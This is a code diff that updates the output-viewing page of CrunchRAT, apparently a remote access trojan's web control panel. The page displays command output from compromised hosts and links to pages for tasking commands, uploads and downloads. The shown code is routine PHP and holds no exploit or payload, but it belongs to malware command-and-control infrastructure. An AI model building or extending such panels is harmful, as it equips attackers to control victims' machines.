@@ -1,7 +1,7 @@
 <?php
   # Necessary at the top of every page for session management
   session_start();
-        
+
   # If the RAT user isn't authenticated
   if (!isset($_SESSION["authenticated"]))
   {
@@ -13,110 +13,94 @@
   {
     # Includes the RAT configuration file
     include "config/config.php";
-    
+
     # Establishes a connection to the RAT database
     # Uses variables from "config/config.php"
     # "SET NAMES utf8" is necessary to be Unicode-friendly
     $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
-  } 
+  }
 ?>
 
 <!doctype html>
 <html lang="en">
-  <head>
+  <head> <!-- Start of header -->
     <meta charset="utf-8">
     <title>CrunchRAT</title>
-    <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
-    <style>
-      body 
-      {
-        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */
-      }
-    </style>
-    <link href="bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
-  </head>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
+    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
+    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
+  </head> <!-- End of header -->
 
-  <body>
-    <div class="navbar navbar-inverse navbar-fixed-top">
-      <div class="navbar-inner">
-        <div class="container">
-          <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-          </button>
-          <a class="brand" href="#">CrunchRAT</a>
-          <div class="nav-collapse collapse">
-            <ul class="nav">
-              <li><a href="hosts.php">Hosts</a></li>
-              <li class="active"><li><a href="command.php">Task Command</a></li>
-              <li><a href="upload.php">Task File Upload</a></li>
-              <li><a href="download.php">Task File Download</a></li>
-              <li class="active"><a href="output.php">View Output</a></li>
-              <li><a href="logout.php">Logout</a></li>
-            </ul>
-          </div><!--/.nav-collapse -->
-        </div>
-      </div>
-    </div>
+  <body> <!-- Start of body -->
+    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
+      <a class="navbar-brand" href="#">CrunchRAT</a>
+      <ul class="nav navbar-nav">
+        <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
+        <li class="nav-item active"><a class="nav-link" href="output.php">View Output</a></li>
+        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
+          <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
+            <li><a href="tasks.php">View Tasks</a></li>
+            <li><a href="command.php">Task Command</a></li>
+            <li><a href="upload.php">Task Upload</a></li>
+            <li><a href="download.php">Task Download</a></li>
+          </ul>
+        </li> <!-- End of "Task" drop-down menu -->
 
-    <div class="container">          
-      <table class="table table-bordered">
+        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
+          <ul class="dropdown-menu">
+            <li><a href="addUser.php">Add User</a></li>
+            <li><a href="changePassword.php">Change Password</a></li>
+            <li role="separator" class="divider"></li>
+            <li><a href="logout.php">Logout</a></li>
+          </ul>
+        </li> <!-- End of "Account Management" drop-down menu -->
+        <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
+      </ul>
+    </nav> <!-- End of navigation bar -->
+
+    <div class="container"> <!-- Start of main body container -->
+      <table class="table table-bordered"> <!-- Start of command output/error table -->
         <tbody>
         <?php
-          $id = $_GET["id"];
-          $stdout = $_GET["stdout"];
-          $stderr = $_GET["stderr"];
-
-          # If user clicked "stdout" hyperlink from "command.php" page
+          # If user clicked "stdout" hyperlink from output.php
           # Displays only stdout
-          if (isset($id) && isset($stdout))
+          if (isset($_GET["id"]) && isset($_GET["stdout"]))
           {
-            # Gets "stdout" for the command and puts it in a HTML table on "viewOut.php"
+            # Gets stdout for the command
             $statement = $dbConnection->prepare("SELECT stdout FROM output WHERE id = :id");
             $statement->bindValue(":id", $_GET["id"]);
             $statement->execute();
-            $results = $statement->fetchAll();
+            $results = $statement->fetch();
 
-            foreach ($results as $row)
-            {
-              echo "<pre>" . htmlentities($row["stdout"], ENT_QUOTES, "UTF-8") . "</pre>";
-            }
+            # Kills database connection
+            $statement->connection = null;
+
+            # Displays command output in HTML table
+            echo "<pre>" . htmlentities($results["stdout"], ENT_QUOTES, "UTF-8") . "</pre>";
           }
             
-          # If user clicked "stderr" hyperlink from "command.php" page
+          # If user clicked "stderr" hyperlink from output.php
           # Displays only stderr
-          if (isset($id) && isset($stderr))
+          if (isset($_GET["id"]) && isset($_GET["stderr"]))
           {
-            # Gets "stderr" for the command and puts it in a HTML table on "viewOut.php"
+            # Gets stderr for the command
             $statement = $dbConnection->prepare("SELECT stderr FROM output WHERE id = :id");
             $statement->bindValue(":id", $_GET["id"]);
             $statement->execute();
-            $results = $statement->fetchAll();
+            $results = $statement->fetch();
 
-            foreach ($results as $row)
-            {
-              echo "<pre>" . htmlentities($row["stderr"], ENT_QUOTES, "UTF-8") . "</pre>";
-            }
+            # Kills database connection
+            $statement->connection = null;
+
+            # Displays command error in HTML table
+            echo "<pre>" . htmlentities($results["stderr"], ENT_QUOTES, "UTF-8") . "</pre>";
           }
         ?>
         </tbody>
-      </table>
-    </div><!-- /container -->
-
-    <!-- Javascript - placed at the bottom so it loads faster -->
-    <script src="bootstrap/js/jquery.js"></script>
-    <script src="bootstrap/js/bootstrap-transition.js"></script>
-    <script src="bootstrap/js/bootstrap-alert.js"></script>
-    <script src="bootstrap/js/bootstrap-modal.js"></script>
-    <script src="bootstrap/js/bootstrap-dropdown.js"></script>
-    <script src="bootstrap/js/bootstrap-scrollspy.js"></script>
-    <script src="bootstrap/js/bootstrap-tab.js"></script>
-    <script src="bootstrap/js/bootstrap-tooltip.js"></script>
-    <script src="bootstrap/js/bootstrap-popover.js"></script>
-    <script src="bootstrap/js/bootstrap-button.js"></script>
-    <script src="bootstrap/js/bootstrap-collapse.js"></script>
-    <script src="bootstrap/js/bootstrap-carousel.js"></script>
-    <script src="bootstrap/js/bootstrap-typeahead.js"></script>
-  </body>
+      </table> <!-- End of command output/error table -->
+    </div> <!-- End main body container -->
+  </body> <!-- End of body -->
 </html>
